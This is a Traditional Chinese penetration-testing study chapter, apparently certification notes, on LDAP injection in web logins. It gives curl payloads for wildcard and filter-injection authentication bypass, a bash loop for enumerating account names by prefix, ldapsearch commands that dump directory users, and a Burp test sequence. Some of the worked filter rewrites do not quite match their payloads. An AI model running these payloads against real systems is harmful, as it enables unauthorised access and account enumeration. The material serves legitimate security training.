# 第 37A 章 - LDAP 注入

## 標籤

- #cpts
- #chapter
- #web
- #authentication
- #ldap
- #injection

## 學習目標

- 理解 LDAP Injection 的成因：使用者輸入直接拼入 LDAP filter。
- 能識別使用 LDAP 驗證的 Web 入口點。
- 掌握萬用字元型、條件拼接型 payload 的測試順序。
- 能用最小化輸入驗證登入繞過（Authentication Bypass）。
- 知道如何用 ldapsearch 確認後端目錄結構。

---

## 理論基礎：LDAP Filter 注入成因

```text
典型 LDAP 驗證查詢（後端 PHP/Python 拼接）：
(&(objectClass=user)(uid=<username>)(userPassword=<password>))

若 username = admin*)(&(objectClass=*
查詢變為：
(&(objectClass=user)(uid=admin*)(&(objectClass=*)(userPassword=...))
→ 條件語意改變，可能繞過驗證

與 SQL Injection 類比：
SQL：SELECT * FROM users WHERE user='admin'--'
LDAP：(&(uid=admin*)(uid=*)) → 萬用匹配所有帳號
```

| LDAP 特殊字元 | 語意 | 注入用途 |
|--------------|------|----------|
| `*` | 萬用字元 | 擴大匹配範圍 |
| `(` `)` | 群組 | 改寫 filter 結構 |
| `&` | AND 邏輯 | 注入額外條件 |
| `\|` | OR 邏輯 | 繞過 AND 限制 |
| `\00` | NULL byte | 截斷查詢（部分 parser）|

---

## 識別 LDAP 入口點

```bash
# 確認目標是否暴露 LDAP 服務
nmap -p 389,636,3268,3269 TARGET_IP
# 389  → LDAP（明文）
# 636  → LDAPS（TLS）
# 3268 → Global Catalog（AD）
# 3269 → Global Catalog over TLS

# 若看到 389 開放 → 推測 Web 應用可能用 LDAP 驗證
# 看 Web 登入表單是否出現帳號/密碼輸入 → 結合測試

# 測試後端是否使用 LDAP（觀察錯誤訊息）
curl -s -X POST http://TARGET/login \
  -d "username=test)(&(objectClass=*&password=x" \
  -H "Content-Type: application/x-www-form-urlencoded"
# 若回應出現 LDAP 相關錯誤（LDAPException / Invalid filter）→ 確認使用 LDAP

# 用括號測試語法敏感性
curl -s -X POST http://TARGET/login \
  -d "username=test(&password=x"
# 不平衡括號 → 若 LDAP 回應異常（500 / 不同錯誤）→ filter 拼接確認
```

---

## 方法一：萬用字元登入繞過

```bash
# 最基本測試：username = *（匹配所有 uid）
curl -s -X POST http://TARGET/login \
  -d "username=*&password=*" \
  -H "Content-Type: application/x-www-form-urlencoded" -v
# * 在 LDAP filter 是萬用字元，若後端直接拼接
# (&(uid=*)(userPassword=*)) → 兩個條件都永真 → 登入繞過

# 若只想繞過密碼驗證（已知帳號 admin）
curl -s -X POST http://TARGET/login \
  -d "username=admin)(&(objectClass=*&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded"
# 注入後 filter 變為：
# (&(uid=admin)(&(objectClass=*)(&(userPassword=anything)))
# 條件語意改變，密碼驗證被繞過

# 常用的簡單 payload 列表
# username=*                  → 萬用匹配
# username=admin)(|(uid=*     → 注入 OR 條件
# username=*)(&(uid=*         → 截斷後加入永真條件
# password=*                  → 密碼欄萬用字元
```

---

## 方法二：帳號枚舉（Wildcard Enumeration）

```bash
# 確認帳號是否存在（用前綴萬用字元）
# 若 a* 登入成功 → 有帳號以 a 開頭
curl -s -X POST http://TARGET/login \
  -d "username=a*&password=*" \
  -H "Content-Type: application/x-www-form-urlencoded"

curl -s -X POST http://TARGET/login \
  -d "username=ad*&password=*"
# 依序縮小前綴 → 枚舉出完整帳號名稱

# 自動化前綴枚舉（bash 迴圈）
for char in {a..z} {0..9}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://TARGET/login \
    -d "username=${char}*&password=*" \
    -H "Content-Type: application/x-www-form-urlencoded")
  echo "$char → $response"
done
# 200/302 與其他帳號的回應不同 → 確認首字元
# 依序加長前綴直到找到完整帳號
```

---

## 方法三：ldapsearch 確認目錄結構

```bash
# 匿名連線查詢（若伺服器允許）
ldapsearch -x \
  -H ldap://TARGET_IP \
  -b "dc=company,dc=com" \
  "(objectClass=*)"
# -x          → simple auth（不用 SASL/Kerberos）
# -H ldap://  → 目標 LDAP URL
# -b "dc=..."  → 搜尋起始 Base DN（需配合目標網域）
# "(objectClass=*)" → 取得所有物件

# 指定帳號查詢
ldapsearch -x \
  -H ldap://TARGET_IP \
  -b "dc=company,dc=com" \
  "(uid=admin)"
# 確認 admin 帳號的屬性結構 → 了解 filter 的欄位名稱

# 已知帳號密碼時認證查詢
ldapsearch -x \
  -H ldap://TARGET_IP \
  -D "uid=admin,dc=company,dc=com" \
  -w PASSWORD \
  -b "dc=company,dc=com" \
  "(objectClass=person)"
# -D "uid=..." → Bind DN（用來認證的帳號 DN）
# -w PASSWORD → 密碼（明文，測試環境用）
# -W          → 互動輸入密碼（生產環境用）

# 查詢所有使用者
ldapsearch -x -H ldap://TARGET_IP \
  -b "dc=company,dc=com" \
  "(objectClass=inetOrgPerson)" uid cn mail
# 最後三個參數是要顯示的屬性名稱（uid / cn / mail）
```

---

## 方法四：Burp Suite 測試流程

```
LDAP Injection 測試在 Burp 中的流程：

1. 攔截登入 POST 請求
2. Send to Repeater
3. 依序測試以下 username payload：
   - test        → 正常失敗（基準）
   - *           → 若成功 → 萬用字元注入確認
   - test)       → 若出現不同錯誤 → filter 語法被帶入
   - admin)(|(   → 條件注入測試

4. 觀察回應差異：
   - HTTP 狀態碼（200 vs 302/303）
   - 回應內容（登入成功頁 vs 錯誤訊息）
   - 回應大小差異

5. 若 * 登入成功但不知道帳號 → 用枚舉方式找帳號名
```

---

## LDAP vs SQL Injection 決策

```
遇到登入表單，如何判斷是 LDAP 還是 SQL？

線索 A：伺服器開放 389/636 埠 → 傾向 LDAP
線索 B：錯誤訊息出現 "LDAPException" / "LDAP filter" → 確認 LDAP
線索 C：注入 ' 或 " 產生 SQL 語法錯誤 → 傾向 SQL
線索 D：注入 ( 或 * 改變行為 → 傾向 LDAP

兩者都可能同時存在，LDAP 注入可獨立測試
先用萬用字元（*），再用 SQL 特殊字元（'）
觀察哪種更敏感
```

---

## 速查表

```bash
# 服務確認
nmap -p 389,636 TARGET_IP

# 語法敏感測試
# POST username=test)(&  → 觀察回應差異

# 萬用字元登入繞過
# POST username=*&password=*

# 帳號枚舉（前綴法）
# POST username=ad*&password=*

# 匿名 LDAP 查詢
ldapsearch -x -H ldap://TARGET_IP -b "dc=target,dc=com" "(objectClass=*)"

# 認證後查詢
ldapsearch -x -H ldap://TARGET_IP -D "uid=admin,dc=target,dc=com" -w PASS -b "dc=target,dc=com" "(objectClass=person)" uid cn
```

---

## 關聯筆記

- [[37-身分驗證攻擊|第 37 章 - 身分驗證攻擊]]
- [[38-SQL注入|第 38 章 - SQL 注入]]
- [[04-Volume-4-Web-Index|Vol.4 - Web Information Gathering and Attacks]]
